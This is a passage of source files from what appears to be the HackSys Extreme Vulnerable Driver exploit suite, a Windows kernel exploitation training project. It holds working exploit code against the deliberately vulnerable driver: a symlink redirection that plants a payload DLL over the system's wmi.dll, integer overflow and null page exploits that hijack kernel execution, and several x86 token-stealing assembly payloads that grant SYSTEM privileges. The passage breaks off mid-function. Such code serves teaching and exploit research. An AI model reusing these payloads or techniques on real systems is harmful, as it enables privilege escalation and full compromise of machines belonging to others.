        DEBUG_INFO("\t\t[+] HEVD.log -> \\GLOBAL??\\C:\\Windows\\System32\\wbem\\wmi.dll\n");

        hTempObject = CreateSymlink(hTempObject, L"HEVD.log", L"\\GLOBAL??\\C:\\Windows\\System32\\wbem\\wmi.dll");

        DEBUG_MESSAGE("\t[+] Getting handle to \\GLOBAL?? Object\n");

        hGlobalRootObject = OpenObjectDirectory(NULL, L"\\GLOBAL??");

        DEBUG_MESSAGE("\t[+] Setting per-process device map to new Object root\n");

        SetProcessDeviceMap(hPerProcessRootObject);

        DEBUG_MESSAGE("\t[+] Triggering Insecure Kernel File Access\n");

        OutputDebugString("****************Kernel Mode****************\n");

        DeviceIoControl(hFile,
                        HACKSYS_EVD_IOCTL_INSECURE_KERNEL_FILE_ACCESS,
                        NULL,
                        0,
                        NULL,
                        0,
                        &BytesReturned,
                        NULL);

        OutputDebugString("****************Kernel Mode****************\n");

        DEBUG_MESSAGE("\t[+] Restoring per-process device map to \\GLOBAL??\n");

        SetProcessDeviceMap(hGlobalRootObject);

        DEBUG_MESSAGE("\t[+] Writing payload DLL in C:\\Windows\\System32\\wbem\\wmi.dll\n");

        WritePayloadDll("C:\\Windows\\System32\\wbem\\wmi.dll");

        DEBUG_MESSAGE("\t[+] Triggering the payload\n");

        LaunchWMIProcess();
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        DEBUG_ERROR("\t\t[-] Exception: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    return EXIT_SUCCESS;
}

```

`Exploit/InsecureKernelResourceAccess.h`:

```h
/*++

          ##     ## ######## ##     ## ########  
          ##     ## ##       ##     ## ##     ## 
          ##     ## ##       ##     ## ##     ## 
          ######### ######   ##     ## ##     ## 
          ##     ## ##        ##   ##  ##     ## 
          ##     ## ##         ## ##   ##     ## 
          ##     ## ########    ###    ########  

        HackSys Extreme Vulnerable Driver Exploit

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    InsecureKernelResourceAccess.h

Abstract:
    This module implements the data structures used by the
    exploit for Insecure Kernel Resource Access Vulnerability
    implemented in HackSys Extreme Vulnerable Driver.

--*/

#ifndef __INSECURE_KERNEL_RESOURCE_ACCESS_H__
    #define __INSECURE_KERNEL_RESOURCE_ACCESS_H__

    #pragma once

    #include "Common.h"

    VOID         LaunchWMIProcess();
    VOID         WritePayloadDll(LPCTSTR szPath);
    NTSTATUS     SetProcessDeviceMap(HANDLE DirectoryHandle);
    HANDLE       OpenObjectDirectory(HANDLE hRoot, LPCWSTR DirectoryName);
    HANDLE       CreateObjectDirectory(HANDLE hRoot, LPCWSTR DirectoryName);
    DWORD WINAPI InsecureKernelFileAccessThread(LPVOID Parameter);
    HANDLE       CreateSymlink(HANDLE hRoot, LPCWSTR SymbolicLinkName, LPCWSTR TargetName);

#endif  //__INSECURE_KERNEL_RESOURCE_ACCESS_H__

```

`Exploit/IntegerOverflow.c`:

```c
/*++

          ##     ## ######## ##     ## ########  
          ##     ## ##       ##     ## ##     ## 
          ##     ## ##       ##     ## ##     ## 
          ######### ######   ##     ## ##     ## 
          ##     ## ##        ##   ##  ##     ## 
          ##     ## ##         ## ##   ##     ## 
          ##     ## ########    ###    ########  

        HackSys Extreme Vulnerable Driver Exploit

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    IntegerOverflow.c

Abstract:
    This module implements the exploit for Integer Overflow
    Vulnerability implemented in HackSys Extreme Vulnerable
    Driver.

--*/

#include "IntegerOverflow.h"

DWORD WINAPI IntegerOverflowThread(LPVOID Parameter) {
    HANDLE hFile = NULL;
    ULONG BytesReturned;
    PVOID MemoryAddress = NULL;
    PULONG UserModeBuffer = NULL;
    LPCSTR FileName = (LPCSTR)DEVICE_NAME;
    PVOID EopPayload = &TokenStealingPayloadWin7;
    SIZE_T UserModeBufferSize = (BUFFER_SIZE + RET_OVERWRITE_INTEGER + BUFFER_TERMINATOR) * sizeof(ULONG);

    __try {
        // Get the device handle
        DEBUG_MESSAGE("\t[+] Getting Device Driver Handle\n");
        DEBUG_INFO("\t\t[+] Device Name: %s\n", FileName);

        hFile = GetDeviceHandle(FileName);

        if (hFile == INVALID_HANDLE_VALUE) {
            DEBUG_ERROR("\t\t[-] Failed Getting Device Handle: 0x%X\n", GetLastError());
            exit(EXIT_FAILURE);
        }
        else {
            DEBUG_INFO("\t\t[+] Device Handle: 0x%X\n", hFile);
        }

        DEBUG_MESSAGE("\t[+] Setting Up Vulnerability Stage\n");

        DEBUG_INFO("\t\t[+] Allocating Memory For Buffer\n");

        // Allocate the Heap chunk
        UserModeBuffer = (PULONG)HeapAlloc(GetProcessHeap(),
                                           HEAP_ZERO_MEMORY,
                                           UserModeBufferSize);

        if (!UserModeBuffer) {
            DEBUG_ERROR("\t\t\t[-] Failed To Allocate Memory: 0x%X\n", GetLastError());
            exit(EXIT_FAILURE);
        }
        else {
            DEBUG_INFO("\t\t\t[+] Memory Allocated: 0x%p\n", UserModeBuffer);
            DEBUG_INFO("\t\t\t[+] Allocation Size: 0x%X\n", UserModeBufferSize);
        }

        DEBUG_INFO("\t\t[+] Preparing Buffer Memory Layout\n");

        RtlFillMemory((PVOID)UserModeBuffer, UserModeBufferSize, 0x41);

        MemoryAddress = (PVOID)(((ULONG)UserModeBuffer + UserModeBufferSize) - (sizeof(ULONG) * 2));
        *(PULONG)MemoryAddress = (ULONG)EopPayload;

        DEBUG_INFO("\t\t\t[+] RET Value: 0x%p\n", *(PULONG)MemoryAddress);
        DEBUG_INFO("\t\t\t[+] RET Address: 0x%p\n", MemoryAddress);

        MemoryAddress = (PVOID)((ULONG)MemoryAddress + sizeof(ULONG));
        *(PULONG)MemoryAddress = (ULONG)0xBAD0B0B0;

        DEBUG_INFO("\t\t[+] EoP Payload: 0x%p\n", EopPayload);

        DEBUG_MESSAGE("\t[+] Triggering Integer Overflow\n");

        OutputDebugString("****************Kernel Mode****************\n");

        DeviceIoControl(hFile,
                        HACKSYS_EVD_IOCTL_INTEGER_OVERFLOW,
                        (LPVOID)UserModeBuffer,
                        (DWORD)0xFFFFFFFF,
                        NULL,
                        0,
                        &BytesReturned,
                        NULL);

        OutputDebugString("****************Kernel Mode****************\n");

        HeapFree(GetProcessHeap(), 0, (LPVOID)UserModeBuffer);

        UserModeBuffer = NULL;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        DEBUG_ERROR("\t\t[-] Exception: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    return EXIT_SUCCESS;
}

```

`Exploit/IntegerOverflow.h`:

```h
/*++

          ##     ## ######## ##     ## ########  
          ##     ## ##       ##     ## ##     ## 
          ##     ## ##       ##     ## ##     ## 
          ######### ######   ##     ## ##     ## 
          ##     ## ##        ##   ##  ##     ## 
          ##     ## ##         ## ##   ##     ## 
          ##     ## ########    ###    ########  

        HackSys Extreme Vulnerable Driver Exploit

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    IntegerOverflow.h

Abstract:
    This module implements the data structures used by the
    exploit for Integer Overflow Vulnerability implemented
    in HackSys Extreme Vulnerable Driver.

--*/

#ifndef __INTEGER_OVERFLOW_H__
    #define __INTEGER_OVERFLOW_H__

    #pragma once

    #include "Common.h"

    #define RET_OVERWRITE_INTEGER 11
    #define BUFFER_TERMINATOR 1

    DWORD WINAPI    IntegerOverflowThread(LPVOID Parameter);

#endif  //__INTEGER_OVERFLOW_H__

```

`Exploit/NullPointerDereference.c`:

```c
/*++

          ##     ## ######## ##     ## ########  
          ##     ## ##       ##     ## ##     ## 
          ##     ## ##       ##     ## ##     ## 
          ######### ######   ##     ## ##     ## 
          ##     ## ##        ##   ##  ##     ## 
          ##     ## ##         ## ##   ##     ## 
          ##     ## ########    ###    ########  

        HackSys Extreme Vulnerable Driver Exploit

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    NullPointerDereference.c

Abstract:
    This module implements the exploit for Null Pointer
    Dereference Vulnerability implemented in HackSys Extreme
    Vulnerable Driver.

--*/

#include "NullPointerDereference.h"

DWORD WINAPI NullPointerDereferenceThread(LPVOID Parameter) {
    HANDLE hFile = NULL;
    ULONG BytesReturned;
    ULONG MagicValue = 0xBAADF00D;
    PVOID NullPointerPlus4 = NULL;
    PVOID NullPageBaseAddress = NULL;
    LPCSTR FileName = (LPCSTR)DEVICE_NAME;
    PVOID EopPayload = &TokenStealingPayloadWin7Generic;

    __try {
        // Get the device handle
        DEBUG_MESSAGE("\t[+] Getting Device Driver Handle\n");
        DEBUG_INFO("\t\t[+] Device Name: %s\n", FileName);

        hFile = GetDeviceHandle(FileName);

        if (hFile == INVALID_HANDLE_VALUE) {
            DEBUG_ERROR("\t\t[-] Failed Getting Device Handle: 0x%X\n", GetLastError());
            exit(EXIT_FAILURE);
        }
        else {
            DEBUG_INFO("\t\t[+] Device Handle: 0x%X\n", hFile);
        }

        DEBUG_MESSAGE("\t[+] Setting Up Vulnerability Stage\n");

        DEBUG_INFO("\t\t[+] Mapping Null Page\n");

        if (!MapNullPage()) {
            DEBUG_ERROR("\t\t[-] Failed Mapping Null Page: 0x%X\n", GetLastError());
            exit(EXIT_FAILURE);
        }

        DEBUG_INFO("\t\t[+] Preparing Null Page Memory Layout\n");

        NullPointerPlus4 = (PVOID)((ULONG)NullPageBaseAddress + 0x4);

        // Now set the function pointer
        *(PULONG)NullPointerPlus4 = (ULONG)EopPayload;

        DEBUG_INFO("\t\t\t[+] NullPage+0x4 Value: 0x%p\n", *(PULONG)NullPointerPlus4);
        DEBUG_INFO("\t\t\t[+] NullPage+0x4 Address: 0x%p\n", NullPointerPlus4);

        DEBUG_INFO("\t\t[+] EoP Payload: 0x%p\n", EopPayload);

        DEBUG_MESSAGE("\t[+] Triggering Null Pointer Dereference\n");

        OutputDebugString("****************Kernel Mode****************\n");

        DeviceIoControl(hFile,
                        HACKSYS_EVD_IOCTL_NULL_POINTER_DEREFERENCE,
                        (LPVOID)&MagicValue,
                        0,
                        NULL,
                        0,
                        &BytesReturned,
                        NULL);

        OutputDebugString("****************Kernel Mode****************\n");
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        DEBUG_ERROR("\t\t[-] Exception: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    return EXIT_SUCCESS;
}

```

`Exploit/NullPointerDereference.h`:

```h
/*++

          ##     ## ######## ##     ## ########  
          ##     ## ##       ##     ## ##     ## 
          ##     ## ##       ##     ## ##     ## 
          ######### ######   ##     ## ##     ## 
          ##     ## ##        ##   ##  ##     ## 
          ##     ## ##         ## ##   ##     ## 
          ##     ## ########    ###    ########  

        HackSys Extreme Vulnerable Driver Exploit

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    NullPointerDereference.h

Abstract:
    This module implements the data structures used by the
    exploit for Null Pointer Dereference Vulnerability
    implemented in HackSys Extreme Vulnerable Driver.

--*/

#ifndef __NULL_POINTER_DEREFERENCE_H__
    #define __NULL_POINTER_DEREFERENCE_H__

    #pragma once

    #include "Common.h"

    DWORD WINAPI    NullPointerDereferenceThread(LPVOID Parameter);

#endif  //__NULL_POINTER_DEREFERENCE_H__

```

`Exploit/Payloads.c`:

```c
/*++

          ##     ## ######## ##     ## ########  
          ##     ## ##       ##     ## ##     ## 
          ##     ## ##       ##     ## ##     ## 
          ######### ######   ##     ## ##     ## 
          ##     ## ##        ##   ##  ##     ## 
          ##     ## ##         ## ##   ##     ## 
          ##     ## ########    ###    ########  

        HackSys Extreme Vulnerable Driver Exploit

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    Payloads.c

Abstract:
    This module implements the EoP payload used for privilege
    escalation after gaining control of the instruction pointer
    in kernel.

Test Bed:
    These payloads have been tested on Windows 7 SP1 x86

TODO:
    1. Try to have a universal payload and add a better way to do Kernel
       Recovery.

--*/

#include "Payloads.h"

#pragma warning(push)
#pragma warning(disable: 4731)

VOID TokenStealingPayloadWin7() {
    // Importance of Kernel Recovery
    __asm {
        pushad                               ; Save registers state

        ; Start of Token Stealing Stub
        xor eax, eax                         ; Set ZERO
        mov eax, fs:[eax + KTHREAD_OFFSET]   ; Get nt!_KPCR.PcrbData.CurrentThread
                                             ; _KTHREAD is located at FS:[0x124]

        mov eax, [eax + EPROCESS_OFFSET]     ; Get nt!_KTHREAD.ApcState.Process

        mov ecx, eax                         ; Copy current process _EPROCESS structure

        mov edx, SYSTEM_PID                  ; WIN 7 SP1 SYSTEM process PID = 0x4

        SearchSystemPID:
            mov eax, [eax + FLINK_OFFSET]    ; Get nt!_EPROCESS.ActiveProcessLinks.Flink
            sub eax, FLINK_OFFSET
            cmp [eax + PID_OFFSET], edx      ; Get nt!_EPROCESS.UniqueProcessId
            jne SearchSystemPID

        mov edx, [eax + TOKEN_OFFSET]        ; Get SYSTEM process nt!_EPROCESS.Token
        mov [ecx + TOKEN_OFFSET], edx        ; Replace target process nt!_EPROCESS.Token
                                             ; with SYSTEM process nt!_EPROCESS.Token
        ; End of Token Stealing Stub

        popad                                ; Restore registers state

        ; Kernel Recovery Stub
        xor eax, eax                         ; Set NTSTATUS SUCCEESS
        add esp, 12                          ; Fix the stack
        pop ebp                              ; Restore saved EBP
        ret 8                                ; Return cleanly
    }
}

VOID TokenStealingPayladGSWin7() {
    // Importance of Kernel Recovery
    __asm {
        pushad                               ; Save registers state

        ; Start of Token Stealing Stub
        xor eax, eax                         ; Set ZERO
        mov eax, fs:[eax + KTHREAD_OFFSET]   ; Get nt!_KPCR.PcrbData.CurrentThread
                                             ; _KTHREAD is located at FS:[0x124]

        mov eax, [eax + EPROCESS_OFFSET]     ; Get nt!_KTHREAD.ApcState.Process

        mov ecx, eax                         ; Copy current process _EPROCESS structure

        mov edx, SYSTEM_PID                  ; WIN 7 SP1 SYSTEM process PID = 0x4

        SearchSystemPID:
            mov eax, [eax + FLINK_OFFSET]    ; Get nt!_EPROCESS.ActiveProcessLinks.Flink
            sub eax, FLINK_OFFSET
            cmp [eax + PID_OFFSET], edx      ; Get nt!_EPROCESS.UniqueProcessId
            jne SearchSystemPID

        mov edx, [eax + TOKEN_OFFSET]        ; Get SYSTEM process nt!_EPROCESS.Token
        mov [ecx + TOKEN_OFFSET], edx        ; Replace target process nt!_EPROCESS.Token
                                             ; with SYSTEM process nt!_EPROCESS.Token
        ; End of Token Stealing Stub

        popad                                ; Restore registers state

        ; Kernel Recovery Stub
        add esp, 0x798                       ; Offset of IRP on stack
        mov edi, [esp]                       ; Restore the pointer to IRP
        add esp, 0x8                         ; Offset of DbgPrint string
        mov ebx, [esp]                       ; Restore the DbgPrint string
        add esp, 0x234                       ; Target frame to return
        xor eax, eax                         ; Set NTSTATUS SUCCEESS
        pop ebp                              ; Restore saved EBP
        ret 8                                ; Return cleanly
    }
}

VOID TokenStealingPayloadWin7New() {
    // Importance of Kernel Recovery
    __asm {
        cmp [ExploitSuccessful], TRUE
        je KernelRecoveryStub

        pushad                               ; Save registers state

        ; Start of Token Stealing Stub
        xor eax, eax                         ; Set ZERO
        mov eax, fs:[eax + KTHREAD_OFFSET]   ; Get nt!_KPCR.PcrbData.CurrentThread
                                             ; _KTHREAD is located at FS:[0x124]

        mov eax, [eax + EPROCESS_OFFSET]     ; Get nt!_KTHREAD.ApcState.Process

        mov ecx, eax                         ; Copy current process _EPROCESS structure

        mov edx, SYSTEM_PID                  ; WIN 7 SP1 SYSTEM process PID = 0x4

        SearchSystemPID:
            mov eax, [eax + FLINK_OFFSET]    ; Get nt!_EPROCESS.ActiveProcessLinks.Flink
            sub eax, FLINK_OFFSET
            cmp [eax + PID_OFFSET], edx      ; Get nt!_EPROCESS.UniqueProcessId
            jne SearchSystemPID

        mov edx, [eax + TOKEN_OFFSET]        ; Get SYSTEM process nt!_EPROCESS.Token
        mov [ecx + TOKEN_OFFSET], edx        ; Replace target process nt!_EPROCESS.Token
                                             ; with SYSTEM process nt!_EPROCESS.Token
        ; End of Token Stealing Stub

        popad                                ; Restore registers state

        mov [ExploitSuccessful], TRUE        ; Set ExploitSuccessful to TRUE

        ; Kernel Recovery Stub
        KernelRecoveryStub:
            xor eax, eax                     ; Set NTSTATUS SUCCEESS
            add esp, 12                      ; Fix the stack
            pop ebp                          ; Restore saved EBP
            ret 8                            ; Return cleanly
    }
}

#pragma warning(pop)

VOID TokenStealingPayloadWin7Generic() {
    // No Need of Kernel Recovery as we are not corrupting anything
    __asm {
        pushad                               ; Save registers state

        ; Start of Token Stealing Stub
        xor eax, eax                         ; Set ZERO
        mov eax, fs:[eax + KTHREAD_OFFSET]   ; Get nt!_KPCR.PcrbData.CurrentThread
                                             ; _KTHREAD is located at FS:[0x124]

        mov eax, [eax + EPROCESS_OFFSET]     ; Get nt!_KTHREAD.ApcState.Process

        mov ecx, eax                         ; Copy current process _EPROCESS structure

        mov edx, SYSTEM_PID                  ; WIN 7 SP1 SYSTEM process PID = 0x4

        SearchSystemPID:
            mov eax, [eax + FLINK_OFFSET]    ; Get nt!_EPROCESS.ActiveProcessLinks.Flink
            sub eax, FLINK_OFFSET
            cmp [eax + PID_OFFSET], edx      ; Get nt!_EPROCESS.UniqueProcessId
            jne SearchSystemPID

        mov edx, [eax + TOKEN_OFFSET]        ; Get SYSTEM process nt!_EPROCESS.Token
        mov [ecx + TOKEN_OFFSET], edx        ; Replace target process nt!_EPROCESS.Token
                                             ; with SYSTEM process nt!_EPROCESS.Token
        ; End of Token Stealing Stub

        popad                                ; Restore registers state
    }
}

VOID TokenStealingPayloadPoolOverflowWin7() {
    __asm {
        pushad                               ; Save registers state

        ; Start of Token Stealing Stub
        xor eax, eax                         ; Set ZERO
        mov eax, fs:[eax + KTHREAD_OFFSET]   ; Get nt!_KPCR.PcrbData.CurrentThread
                                             ; _KTHREAD is located at FS:[0x124]

        mov eax, [eax + EPROCESS_OFFSET]     ; Get nt!_KTHREAD.ApcState.Process

        mov ecx, eax                         ; Copy current process _EPROCESS structure

        mov edx, SYSTEM_PID                  ; WIN 7 SP1 SYSTEM process PID = 0x4

        SearchSystemPID:
            mov eax, [eax + FLINK_OFFSET]    ; Get nt!_EPROCESS.ActiveProcessLinks.Flink
            sub eax, FLINK_OFFSET
            cmp [eax + PID_OFFSET], edx      ; Get nt!_EPROCESS.UniqueProcessId
            jne SearchSystemPID

        mov edx, [eax + TOKEN_OFFSET]        ; Get SYSTEM process nt!_EPROCESS.Token
        mov [ecx + TOKEN_OFFSET], edx        ; Replace target process nt!_EPROCESS.Token
                                             ; with SYSTEM process nt!_EPROCESS.Token
        ; End of Token Stealing Stub

        popad                                ; Restore registers state

        ; Kernel Recovery Stub
        mov eax, 0x1
    }
}

VOID TokenStealingPayloadDuplicateToken() {
    // 1. Get handle to SYSTEM process
    // 2. Get the token of SYSTEM process
    // 3. Duplicate the token
    // 4. Set current process token to new privileged token
    // Examples:
    // http://j00ru.vexillium.org/?p=1272
    // http://www.wasm.ru/forum/viewtopic.php?id=29591
    //
    HMODULE hModule = NULL;
    CLIENT_ID ClientId = { 0 };
    HANDLE hSystemProcess = NULL;
    PEPROCESS CurrentProcess = NULL;
    HANDLE hSystemProcessToken = NULL;
    HANDLE hNewPrivilegedToken = NULL;
    NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;
    PROCESS_ACCESS_TOKEN AccessToken = { 0 };
    OBJECT_ATTRIBUTES ObjectAttributes = { 0 };

    ClientId.UniqueProcess = (HANDLE)0x4;

    InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);
    NtStatus = ZwOpenProcess(&hSystemProcess, GENERIC_ALL, &ObjectAttributes, &ClientId);

    NtStatus = ZwOpenProcessToken(hSystemProcess, GENERIC_ALL, &hSystemProcessToken);

    InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);
    NtStatus = ZwDuplicateToken(hSystemProcessToken,
                                TOKEN_ALL_ACCESS,
                                &ObjectAttributes,
                                TRUE,
                                TokenPrimary,
                                &hNewPrivilegedToken);

    AccessToken.Token = hNewPrivilegedToken;

    // Fix the issue with PrimaryTokenFrozen
    CurrentProcess = PsGetCurrentProcess();

    // Now set PrimaryTokenFrozen to NULL
